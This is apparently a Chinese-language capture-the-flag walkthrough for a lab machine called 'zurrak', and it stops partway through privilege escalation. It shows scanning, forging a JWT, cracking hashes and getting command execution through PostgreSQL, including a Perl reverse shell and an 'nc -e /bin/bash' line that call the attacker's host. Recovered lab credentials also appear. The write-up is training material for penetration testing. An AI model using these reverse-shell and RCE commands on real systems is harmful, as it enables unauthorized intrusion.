@@ -1,0 +1,838 @@
+# zurrak
+
+<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404071800964.png" alt="image-20240407141103180" style="zoom:50%;" />
+
+## 信息搜集
+
+### 端口扫描
+
+```bash
+rustscan -a 172.20.10.3 -- -A 
+```
+
+```css
+Open 172.20.10.3:80
+Open 172.20.10.3:139
+Open 172.20.10.3:445
+Open 172.20.10.3:5432
+
+PORT     STATE SERVICE     REASON  VERSION
+80/tcp   open  http        syn-ack Apache httpd 2.4.57 ((Debian))
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+| http-title: Login Page
+|_Requested resource was login.php
+|_http-server-header: Apache/2.4.57 (Debian)
+139/tcp  open  netbios-ssn syn-ack Samba smbd 4.6.2
+445/tcp  open  netbios-ssn syn-ack Samba smbd 4.6.2
+5432/tcp open  postgresql  syn-ack PostgreSQL DB 9.6.0 or later
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=zurrak
+| Subject Alternative Name: DNS:zurrak
+| Issuer: commonName=zurrak
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2023-10-20T19:29:16
+| Not valid after:  2033-10-17T19:29:16
+| MD5:   2c24:bdb8:b7d7:8fa8:51f0:1be2:2625:3a9d
+| SHA-1: 086e:bf83:1204:d0ef:0230:4290:8a92:b641:d3f4:ceaf
+| -----BEGIN CERTIFICATE-----
+| MIIC7zCCAdegAwIBAgIUTdKMVheATMcefGITp05Zwlj8vsgwDQYJKoZIhvcNAQEL
+| BQAwETEPMA0GA1UEAwwGenVycmFrMB4XDTIzMTAyMDE5MjkxNloXDTMzMTAxNzE5
+| MjkxNlowETEPMA0GA1UEAwwGenVycmFrMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
+| MIIBCgKCAQEA1mhNG6o60cGsrq4iA6Tw2S6IDWRmx6PBz7V8e137c29wNuxu/NSe
+| Xr8LWR6lbjI1SJFnn380kI+QoXpUx2dGc7coHJF+ZXZ8spl0mvPvGPRlc3SaCk5c
+| 3O88NOgIfA5rEwHdSdYdzBsmxaifhjibW+CPm9OMKmrhhaxeusfSF0Z2PPQiRF3r
+| zqrvYEhcjbGy2MJrQqVRiT17WHp0IxzErIsAaOICbEkWK5cyraG67WIT34SZc/EG
+| VTbEGxm3uILog4pVePNP1wrObG1RAnvdePZLYqy4f+SGqSERo+9OmAmP3Wlpo43U
+| bZlwu1NCY81LV/T5htm0as6Euqfa7rPfEQIDAQABoz8wPTAJBgNVHRMEAjAAMBEG
+| A1UdEQQKMAiCBnp1cnJhazAdBgNVHQ4EFgQUWAXLgNI0sXpXQKbUVFqdGH5EfNAw
+| DQYJKoZIhvcNAQELBQADggEBAIAk/vaV6QkjotcEIm7pT1gYZVdngBBoge9WYse9
+| suUMhoQvXjep6MoLG8wCPcNNw9GpCSQrzOuxfiovhk0WfLnRDJ9XdyL0GTt3lELh
+| kdIdeJUZh4MrhjyCrzASQlbQkfrMhiOOhIedtrfb1I9XSFZqFTjYRjsYRBFRc6Mc
+| oTkR3KurLUg8cqYLa5f7j9TLpgGIfNlUfvw7WyrSX0sIL2I5kMHwLP1ayWHVspXr
+| lq6PWoN6UVW4+NKNok7ty3CxOvVUabAlTiqkRRK3Hxr5e7y+oCIjfrYSQyl3JrRH
+| zHHGJB6H9nMbKafvqiBpdg8QL/Fp2mvTalwfRKP8QEhRZeY=
+|_-----END CERTIFICATE-----
+| fingerprint-strings: 
+|   SMBProgNeg: 
+|     SFATAL
+|     VFATAL
+|     C0A000
+|     Munsupported frontend protocol 65363.19778: server supports 3.0 to 3.0
+|     Fpostmaster.c
+|     L2195
+|_    RProcessStartupPacket
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port5432-TCP:V=7.94SVN%I=7%D=4/7%Time=66123916%P=x86_64-pc-linux-gnu%r(
+SF:SMBProgNeg,8C,"E\0\0\0\x8bSFATAL\0VFATAL\0C0A000\0Munsupported\x20front
+SF:end\x20protocol\x2065363\.19778:\x20server\x20supports\x203\.0\x20to\x2
+SF:03\.0\0Fpostmaster\.c\0L2195\0RProcessStartupPacket\0\0");
+
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2024-04-07T06:11:59
+|_  start_date: N/A
+|_clock-skew: 18s
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 39463/tcp): CLEAN (Couldn't connect)
+|   Check 2 (port 52224/tcp): CLEAN (Couldn't connect)
+|   Check 3 (port 47754/udp): CLEAN (Timeout)
+|   Check 4 (port 54992/udp): CLEAN (Failed to receive data)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+```
+
+### 目录扫描
+
+```bash
+gobuster dir -u http://172.20.10.3 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+```
+
+```bash
+/vendor               (Status: 301) [Size: 311] [--> http://172.20.10.3/vendor/]
+/server-status        (Status: 403) [Size: 276]
+```
+
+```bash
+gobuster dir -u http://172.20.10.3 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,zip,git,jpg,txt,png
+```
+
+```css
+/.php                 (Status: 403) [Size: 276]
+/index.php            (Status: 302) [Size: 1270] [--> login.php]
+/login.php            (Status: 200) [Size: 2041]
+/admin.php            (Status: 302) [Size: 2624] [--> login.php]
+/vendor               (Status: 301) [Size: 311] [--> http://172.20.10.3/vendor/]
+/index_.php           (Status: 200) [Size: 200]
+/.php                 (Status: 403) [Size: 276]
+/server-status        (Status: 403) [Size: 276]
+```
+
+### 漏洞扫描
+
+```bash
+nikto -h http://172.20.10.3
+```
+
+```css
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          172.20.10.3
++ Target Hostname:    172.20.10.3
++ Target Port:        80
++ Start Time:         2024-04-07 02:15:23 (GMT-4)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.57 (Debian)
++ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
++ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ Root page / redirects to: login.php
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ /login.php: Admin login page/section found.
++ /composer.json: PHP Composer configuration file reveals configuration information. See: https://getcomposer.org/
++ /composer.lock: PHP Composer configuration file reveals configuration information. See: https://getcomposer.org/
++ 8102 requests: 0 error(s) and 5 item(s) reported on remote host
++ End Time:           2024-04-07 02:15:43 (GMT-4) (20 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+```
+
+## 漏洞挖掘
+
+### 踩点
+
+<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404071800966.png" alt="image-20240407141735964" style="zoom:50%;" />
+
+### 敏感端口探测
+
+开启了一个`smb`服务和一个`PostgreSQL`数据库：
+
+看一下有些啥：
+
+```bash
+enum4linux 172.20.10.3
+```
+
+<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404071800967.png" alt="image-20240407142344912" style="zoom: 33%;" />
+
+神魔情况。。。。换一个试试：
+
+```bash
+smbmap -H 172.20.10.3
+```
+
+<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404071800968.png" alt="image-20240407142436593" style="zoom:33%;" />
+
+看来暂时走不通这条路了。
+
+### 源码分析
+
+打开源码的时候看到给出了账号密码了：
+
+```text
+ <!-- username:internal@zurrak.htb && password:testsite -->
+```
+
+登录一下，空白页，源代码发现：
+
+```text
+<!-- <a class="navbar-brand" href="admin.php">Admin Panel</a>-->
+```
+
+返回看一下这个`admin.php`，没有发生变化，啥都没有。。
+
+### 敏感目录分析
+
+查看一下`index_.php`：
+
+```text
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vZXhhbXBsZS5vcmciLCJhdWQiOiJodHRwOi8vZXhhbXBsZS5jb20iLCJpYXQiOjEzNTY5OTk1MjQsIm5iZiI6MTM1NzAwMDAwMH0.gOEkQc3YCCIIjE-GxU0UTa9Lx6hQwwk5zYfO4pZQZt4
+```
+
+分成三段，看上去像是jwt，丢[网站](https://jwt.io/)上看看：
+
+<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404071800969.png" alt="image-20240407143831763" style="zoom:50%;" />
+
+尝试搜索一下相关信息：
+
+<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404071800970.png" alt="image-20240407143940459" style="zoom:50%;" />
+
+```text
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJlbWFpbCI6ImludGVybmFsQHp1cnJhay5odGIiLCJpc0FkbWluIjpmYWxzZSwiaWF0IjoxMzU2OTk5NTI0LCJuYmYiOjEzNTcwMDAwMDB9.ufkwBsusc4IEYCCRszCbcSEv6irCtUSx-Uq08OThxso
+```
+
+解密一下：
+
+<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404071800971.png" alt="image-20240407144004986" style="zoom:50%;" />
+
+
+
+### 伪造JWT
+
+存在`isAdmin`字段，伪造一下请求：
+
+![image-20240407144140080](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404071800972.png)
+
+还差一个密钥，爆破一下：
+
+```bash
+python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJlbWFpbCI6ImludGVybmFsQHp1cnJhay5odGIiLCJpc0FkbWluIjpmYWxzZSwiaWF0IjoxMzU2OTk5NTI0LCJuYmYiOjEzNTcwMDAwMDB9.ufkwBsusc4IEYCCRszCbcSEv6irCtUSx-Uq08OThxso -C -d /usr/share/wordlists/rockyou.txt
+```
+
+<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404071800973.png" alt="image-20240407145257365" style="zoom:50%;" />
+
+尝试伪造一下请求：
+
+<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404071800974.png" alt="image-20240407145428692" style="zoom:50%;" />
+
+```text
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJlbWFpbCI6ImludGVybmFsQHp1cnJhay5odGIiLCJpc0FkbWluIjp0cnVlLCJpYXQiOjEzNTY5OTk1MjQsIm5iZiI6MTM1NzAwMDAwMH0.gBpFlpNfVUBlv9HuqXqVzRtaHR265PFagumX_OAKCMY
+```
+
+尝试使用这个token进行登录：
+
+<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404071800975.png" alt="image-20240407145726033" style="zoom:50%;" />
+
+### 图片隐写
+
+中间提示存在隐写了，尝试提取一下：
+
+```apl
+http://172.20.10.3/zurrakhorse.jpg
+http://172.20.10.3/zurraksnake.jpg
+http://172.20.10.3/zurrakhearts.jpg
+```
+
+下载一下，发现都藏了东西，爆破一下：
+
+<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404071800976.png" alt="image-20240407150438397" style="zoom: 50%;" />
+
+放到本地来，反编译一下：
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  __int64 v4; // [rsp+20h] [rbp-60h]
+  __int64 v5; // [rsp+28h] [rbp-58h]
+  __int64 v6; // [rsp+30h] [rbp-50h]
+  __int64 v7; // [rsp+38h] [rbp-48h]
+  __int64 v8; // [rsp+40h] [rbp-40h]
+  __int64 v9; // [rsp+48h] [rbp-38h]
+  char v10; // [rsp+50h] [rbp-30h]
+
+  _main(*(_QWORD *)&argc, argv, envp);
+  LODWORD(v9) = 115;
+  LODWORD(v8) = 116;
+  LODWORD(v7) = 97;
+  LODWORD(v6) = 99;
+  LODWORD(v5) = 101;
+  LODWORD(v4) = 118;
+  c(&v10, 105i64, 108i64, 111i64, v4, v5, v6, v7, v8, v9);
+  printf("classified\n");
+  return 0;
+}
+```
+
+```c
+__int64 c(char *a1, unsigned int a2, ...)
+{
+  __int64 result; // rax
+  unsigned int *v3; // ST20_8
+  unsigned int *v4; // rax
+  va_list v5; // [rsp+20h] [rbp-10h]
+  char i; // [rsp+2Fh] [rbp-1h]
+  char *v7; // [rsp+40h] [rbp+10h]
+  va_list va; // [rsp+50h] [rbp+20h]
+
+  va_start(va, a2);
+  v7 = a1;
+  va_copy(v5, va);
+  result = a2;
+  for ( i = a2; i; i = result )
+  {
+    sprintf(v7, "%s%c", v7, (unsigned int)i, v5);
+    v4 = v3;
+    v5 = (va_list)(v3 + 2);
+    result = *v4;
+  }
+  return result;
+}
+```
+
+这段代码我看的也迷迷糊糊，但是上面main函数存储了一个数组内容如下：
+
+```text
+105,108,111,118,110,99,97,116,115
+```
+
+转化成字符串为：
+
+<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404071800977.png" alt="image-20240407151545260" style="zoom:50%;" />
+
+故得出账号密码：
+
+```apl
+asli
+ilovncats
+```
+
+尝试ssh登录，发现错误：
+
+```text
+ssh asli@172.20.10.3
+ssh: connect to host 172.20.10.3 port 22: Connection refused
+```
+
+错误尝试smb连接：
+
+### SMB连接
+
+先探测一下：
+
+```bash
+smbmap -u asli -p ilovncats -H 172.20.10.3
+```
+
+<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404071800978.png" alt="image-20240407152047579" style="zoom:50%;" />
+
+what？
+
+```bash
+smbclient //172.20.10.3/share -U asli --password ilovncats
+```
+
+也连不上去，难道是密码搞错了？
+
+拿`Ghidra`看看：
+
+```c
+int __cdecl main(int _Argc,char **_Argv,char **_Env)
+
+{
+  undefined1 (*pauVar1) [10];
+  undefined8 uVar2;
+  undefined8 uVar3;
+  FILE local_208 [10];
+  
+  __main();
+  uVar3 = 0x6f;
+  uVar2 = 0x6c;
+  pauVar1 = (undefined1 (*) [10])0x69;
+  c(local_208,'i',0x6c,0x6f,0x76,0x65,99,0x61,0x74,0x73);
+  printf("classified\n",pauVar1,uVar2,uVar3);
+  return 0;
+}
+```
+
+<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404071800979.png" alt="image-20240407155632600" style="zoom:33%;" />
+
+啊。。。。。
+
+```bash
+smbclient //172.20.10.3/share -U asli --password ilovecats
+```
+
+然后在漫长的信息搜集过程中找到了一个硬盘文件。。。。
+
+```css
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Fri Oct 20 17:14:00 2023
+  ..                                  D        0  Fri Oct 20 16:36:51 2023
+  DONTDELETE                          D        0  Fri Oct 20 23:44:44 2023
+  operations                          D        0  Sat Oct 21 00:04:30 2023
+  backup.reg                          N     1792  Sun Jul 24 01:30:09 2011
+  human_resources                     D        0  Sun Apr  2 01:30:09 2017
+  launch_options.txt                  N       21  Tue Dec 13 22:55:16 2022
+
+                9232860 blocks of size 1024. 6042972 blocks available
+smb: \> cd operations\
+smb: \operations\> ls
+  .                                   D        0  Sat Oct 21 00:04:30 2023
+  ..                                  D        0  Fri Oct 20 17:14:00 2023
+  binaries                            D        0  Tue Nov 14 04:08:42 2023
+  operators.txt                       N      118  Tue Dec 18 01:30:09 2001
+  New folder                          D        0  Tue Dec 18 01:30:09 2001
+
+                9232860 blocks of size 1024. 6042972 blocks available
+smb: \operations\> get operators.txt 
+getting file \operations\operators.txt of size 118 as operators.txt (3.2 KiloBytes/sec) (average 3.2 KiloBytes/sec)
+smb: \operations\> cd New folder\
+cd \operations\New\: NT_STATUS_OBJECT_NAME_NOT_FOUND
+smb: \operations\> ls
+  .                                   D        0  Sat Oct 21 00:04:30 2023
+  ..                                  D        0  Fri Oct 20 17:14:00 2023
+  binaries                            D        0  Tue Nov 14 04:08:42 2023
+  operators.txt                       N      118  Tue Dec 18 01:30:09 2001
+  New folder                          D        0  Tue Dec 18 01:30:09 2001
+
+                9232860 blocks of size 1024. 6042972 blocks available
+smb: \operations\> cd 'New folder'
+cd \operations\'New\: NT_STATUS_OBJECT_NAME_NOT_FOUND
+smb: \operations\> cd "New folder"
+smb: \operations\New folder\> ls 
+  .                                   D        0  Tue Dec 18 01:30:09 2001
+  ..                                  D        0  Sat Oct 21 00:04:30 2023
+  deploy                              D        0  Fri Oct 20 23:52:42 2023
+
+                9232860 blocks of size 1024. 6042972 blocks available
+smb: \operations\New folder\> cd deploy\
+smb: \operations\New folder\deploy\> ls
+  .                                   D        0  Fri Oct 20 23:52:42 2023
+  ..                                  D        0  Tue Dec 18 01:30:09 2001
+  3                                   D        0  Tue Dec 18 01:30:09 2001
+  2                                   D        0  Tue Dec 18 01:30:09 2001
+  4                                   D        0  Tue Dec 18 01:30:09 2001
+  1                                   D        0  Tue Dec 18 01:30:09 2001
+
+                9232860 blocks of size 1024. 6042972 blocks available
+smb: \operations\New folder\deploy\> cd 1
+smb: \operations\New folder\deploy\1\> ls
+  .                                   D        0  Tue Dec 18 01:30:09 2001
+  ..                                  D        0  Fri Oct 20 23:52:42 2023
+  read.txt                            N       15  Tue Dec 18 01:30:09 2001
+  approved                            D        0  Tue Dec 18 01:30:09 2001
+  declined                            D        0  Tue Dec 18 01:30:09 2001
+
+                9232860 blocks of size 1024. 6042972 blocks available
+smb: \operations\New folder\deploy\1\> cd ../2
+smb: \operations\New folder\deploy\2\> ls
+  .                                   D        0  Tue Dec 18 01:30:09 2001
+  ..                                  D        0  Fri Oct 20 23:52:42 2023
+  read.txt                            N       15  Tue Dec 18 01:30:09 2001
+  approved                            D        0  Tue Dec 18 01:30:09 2001
+  declined                            D        0  Tue Dec 18 01:30:09 2001
+
+                9232860 blocks of size 1024. 6042972 blocks available
+smb: \operations\New folder\deploy\2\> cd ../3
+smb: \operations\New folder\deploy\3\> ls
+  .                                   D        0  Tue Dec 18 01:30:09 2001
+  ..                                  D        0  Fri Oct 20 23:52:42 2023
+  latest                              D        0  Tue Dec 18 01:30:09 2001
+
+                9232860 blocks of size 1024. 6042972 blocks available
+smb: \operations\New folder\deploy\3\> cd ../4
+smb: \operations\New folder\deploy\4\> ls
+  .                                   D        0  Tue Dec 18 01:30:09 2001
+  ..                                  D        0  Fri Oct 20 23:52:42 2023
+  read.txt                            N       15  Tue Dec 18 01:30:09 2001
+  approved                            D        0  Tue Dec 18 01:30:09 2001
+  declined                            D        0  Tue Dec 18 01:30:09 2001
+
+                9232860 blocks of size 1024. 6042972 blocks available
+smb: \operations\New folder\deploy\4\> cd ../3
+smb: \operations\New folder\deploy\3\> cd latest\
+smb: \operations\New folder\deploy\3\latest\> ls
+  .                                   D        0  Tue Dec 18 01:30:09 2001
+  ..                                  D        0  Tue Dec 18 01:30:09 2001
+  approved                            D        0  Tue Oct 24 16:21:21 2023
+  declined                            D        0  Tue Dec 18 01:30:09 2001
+
+                9232860 blocks of size 1024. 6042972 blocks available
+smb: \operations\New folder\deploy\3\latest\> cd approved\
+smb: \operations\New folder\deploy\3\latest\approved\> ls
+  .                                   D        0  Tue Oct 24 16:21:21 2023
+  ..                                  D        0  Tue Dec 18 01:30:09 2001
+  zurrak.old.vmdk                     N 713883648  Tue Dec 18 01:30:09 2001
+
+                9232860 blocks of size 1024. 6042972 blocks available
+smb: \operations\New folder\deploy\3\latest\approved\> 
+smb: \operations\New folder\deploy\3\latest\approved\> get zurrak.old.vmdk 
+getting file \operations\New folder\deploy\3\latest\approved\zurrak.old.vmdk of size 713883648 as zurrak.old.vmdk (34234.5 KiloBytes/sec) (average 34174.1 KiloBytes/sec)
+smb: \operations\New folder\deploy\3\latest\approved\> cd ../
+smb: \operations\New folder\deploy\3\latest\> cd declined\
+smb: \operations\New folder\deploy\3\latest\declined\> ls
+  .                                   D        0  Tue Dec 18 01:30:09 2001
+  ..                                  D        0  Tue Dec 18 01:30:09 2001
+
+                9232860 blocks of size 1024. 6042972 blocks available
+smb: \operations\New folder\deploy\3\latest\declined\> exit
+```
+
+```bash
+cat operators.txt 
+emir:Tlyu4#f
+john:O0p12Az
+freddie:KAsz241
+albert:Lqak25r4
+
+please change your credentials after reaching endpoint 
+```
+
+尝试ssh登录，但是都失败了，创建虚拟机，我选择以接受度最广的`vmware16.0`进行创建，但是报错了：
+
+<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404071800980.png" alt="image-20240407160955295" style="zoom:50%;" />
+
+修改为17.0 成功！
+
+<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404071800981.png" alt="image-20240407161239192" style="zoom:50%;" />
+
+究极套娃！运行一下：
+
+<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404071800982.png" alt="image-20240407161609199" style="zoom:50%;" />
+
+what？扫一下：
+
+<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404071800983.png" alt="image-20240407162338184" style="zoom:50%;" />
+
+妈呀，我真的。。。grub一下！
+
+<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404071800984.png" alt="image-20240407162424171" style="zoom:50%;" />
+
+<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404071800985.png" alt="image-20240407162459382" style="zoom:50%;" />
+
+查看一下相关文件：
+
+<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404071800986.png" alt="image-20240407162933534" style="zoom:50%;" />
+
+<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404071800987.png" alt="image-20240407162915177" style="zoom:50%;" />
+
+ocr 一下，尝试hash爆破一下：
+
+```text
+postgres:$6$ZaTjsuy0$rBmhDDcT45A.p6chCl53MNn3c3k2lKjSn5sneyxOxaVpozADMVScztCYmdyexb4Gy7IvwlbBwzvRd.krKqT1L/:19654:0:99999:7:::
+```
+
+> 这里搞错好多次了，建议直接复制这个节省时间。
+
+```bash
+john shadow.txt --wordlist=/usr/share/wordlists/rockyou.txt
+```
+
+```bash
+┌──(kali💀kali)-[~/temp/zurrak]
+└─$ john shadow.txt --wordlist=/usr/share/wordlists/rockyou.txt 
+Using default input encoding: UTF-8
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+baller15         (postgres)     
+1g 0:00:00:09 DONE (2024-04-07 05:02) 0.1106g/s 3115p/s 3115c/s 3115C/s chrisd..skate123
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+```
+
+找到密码了！
+
+除此之外，我们发现里面的root也有hash密码，尝试也爆破一下：
+
+<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404071800988.png" alt="image-20240407170521561" style="zoom:50%;" />
+
+我就不尝试了（实际上已经搞了，发现爆破不出来估计是哪个字母搞错了，懒得搞了）
+
+### POSTGRESQL连接
+
+https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql
+
+```bash
+psql -h <host> -p <port> -U <username> -W <password> <database> # Remote connection
+psql -h 172.20.10.3 -p 5432 -U postgres 
+```
+
+查询内容，但是实在麻烦，我也不太会只能一个一个查，尝试使用提供的poc实现rce！
+
+```bash
+#PoC
+DROP TABLE IF EXISTS cmd_exec;
+CREATE TABLE cmd_exec(cmd_output text);
+COPY cmd_exec FROM PROGRAM 'id';
+SELECT * FROM cmd_exec;
+DROP TABLE IF EXISTS cmd_exec;
+
+#Reverse shell
+#Notice that in order to scape a single quote you need to put 2 single quotes
+COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.104:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
+```
+
+```bash
+COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"172.20.10.8:1234");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
+```
+
+似乎不行，换一个：
+
+```bash
+DROP TABLE IF EXISTS cmd_exec;
+CREATE TABLE cmd_exec(cmd_output text);
+COPY cmd_exec FROM PROGRAM 'nc -e /bin/bash 172.20.10.8 1234';
+SELECT * FROM cmd_exec;
+```
+
+<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404071800989.png" alt="image-20240407172607479" style="zoom:50%;" />
+
+## 提权
+
+### 信息搜集
+
+```bash
+(remote) postgres@zurrak:/$ find / -perm -u=s -type f 2>/dev/null
+/usr/bin/chfn
+/usr/bin/umount
+/usr/bin/passwd
+/usr/bin/mount
+/usr/bin/fusermount3
+/usr/bin/su
+/usr/bin/chsh
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+(remote) postgres@zurrak:/$ find / -writable -type f 2>/dev/null
+/var/log/postgresql/postgresql-15-main.log.2.gz
+/var/log/postgresql/postgresql-15-main.log.1
+/var/log/postgresql/postgresql-15-main.log
+(remote) postgres@zurrak:/$ cd /home
+(remote) postgres@zurrak:/home$ ls
+postgres
+(remote) postgres@zurrak:/home$ cd postgres/
+(remote) postgres@zurrak:/home/postgres$ ls
+emergency.sh  user.txt
+(remote) postgres@zurrak:/home/postgres$ cat user.txt 
+fe8f97f109ceb0362c95e60338c4c1a8
+(remote) postgres@zurrak:/home/postgres$ ls -la
+total 16
+drwxr-xr-x 2 postgres postgres 4096 Oct 24 18:03 .
+drwxr-xr-x 3 root     root     4096 Oct 20 19:06 ..
+-rw------- 1 postgres postgres   28 Oct 24 16:47 emergency.sh
+-rw-r--r-- 1 postgres postgres   33 Oct 20 20:23 user.txt
+(remote) postgres@zurrak:/home/postgres$ cat emergency.sh 
+echo "root:1234" | chpasswd
+(remote) postgres@zurrak:/home/postgres$ cat /etc/cron*
+cat: /etc/cron.d: Is a directory
+cat: /etc/cron.daily: Is a directory
+cat: /etc/cron.hourly: Is a directory
+cat: /etc/cron.monthly: Is a directory
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# Example of job definition:
+# .---------------- minute (0 - 59)
+# |  .------------- hour (0 - 23)
+# |  |  .---------- day of month (1 - 31)
+# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+# |  |  |  |  |
+# *  *  *  *  * user-name command to be executed
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
+47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
+52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
+#
+cat: /etc/cron.weekly: Is a directory
+cat: /etc/cron.yearly: Is a directory
+(remote) postgres@zurrak:/home/postgres$ cat crontab -l
+cat: invalid option -- 'l'
+Try 'cat --help' for more information.
+(remote) postgres@zurrak:/home/postgres$ crontab -l
+no crontab for postgres
+(remote) postgres@zurrak:/home/postgres$ cd /tmp
+(remote) postgres@zurrak:/tmp$ 
+(local) pwncat$ lpwd
+/home/kali/temp/zurrak
+(local) pwncat$ lcd ..
+(local) pwncat$ upload linpeas.sh
+./linpeas.sh ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100.0% • 860.5/860.5 KB • ? • 0:00:00[05:30:36] uploaded 860.55KiB in 0.84 seconds                                                                                                   upload.py:76
+(local) pwncat$                                                                                                                                             
+(remote) postgres@zurrak:/tmp$ chmod +x linpeas.sh 
+(remote) postgres@zurrak:/tmp$ ./linpeas.sh 
+```
+
+<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404071800990.png" alt="image-20240407173304199" style="zoom:50%;" />
+
+<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404071800991.png" alt="image-20240407173648829" style="zoom:50%;" />
+
+发现了使用`emergency.sh`的地方，查看一下：
+
+```bash
+(remote) postgres@zurrak:/$ su emre
+Password: 
+su: Authentication failure
+(remote) postgres@zurrak:/$ vim /etc/samba/smb.conf 
+bash: vim: command not found
+(remote) postgres@zurrak:/$ cat /etc/samba/smb.conf 
+......
+[ipc$]
+hosts allow = 127.0.0.1
+hosts deny = 0.0.0.0/0
+guest ok = no
+browseable = no
+
+[share]
+comment = "zurrak operations share"
+path = /opt/smbshare
+hosts allow = 0.0.0.0/0
+guest ok = no
+browseable = yes
+writable = no
+valid users = emre, asli
+
+[internal]
+comment = "zurrak internal share"
+path = /opt/internal
+hosts allow = 127.0.0.1
+guest ok = no
+browseable = yes
+writable = yes
+valid users = emre
+create mask = 0777
+directory mask = 0777
+force user = root
+magic script = emergency.sh
+```
+
+发现一个只可以从内部连接的smb服务，尝试连接一下：
+
+```bash
+(remote) postgres@zurrak:/$ smbclient \\\\127.0.0.1\\internal -U emre
+Password for [ZURRAK.HMV\emre]:
+session setup failed: NT_STATUS_LOGON_FAILURE
+(remote) postgres@zurrak:/$ cd /opt/internal
+(remote) postgres@zurrak:/opt/internal$ ls -la
+total 8
+drwxr-xr-x 2 shareuser root 4096 Oct 20 19:02 .
